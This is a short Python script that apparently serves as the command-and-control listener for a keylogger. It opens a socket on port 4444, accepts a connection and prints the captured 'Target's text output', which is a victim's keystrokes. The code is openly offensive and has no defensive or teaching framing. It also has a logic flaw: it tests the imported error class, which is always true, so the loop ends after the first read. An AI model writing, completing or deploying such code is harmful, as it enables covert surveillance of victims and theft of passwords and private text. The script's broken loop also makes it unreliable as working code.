from socket import socket, AF_INET, SOCK_STREAM, error

# Opens a socket in 127.0.0.1:4444 and waits for a connection from the keyllogger
s = socket(AF_INET, SOCK_STREAM)
s.bind(('', 4444))
s.listen(1)
print('[+] Waiting for connection...')
connection, addr = s.accept()
print(f'[+] Connection received from {addr[0]}:{addr[1]}')
print('[+] Target\'s text output:')
while True:
    print(str(connection.recv(1024))[2:-1])
    if error:
        s.close()
        print('\n[+] End of the connection!')
        break
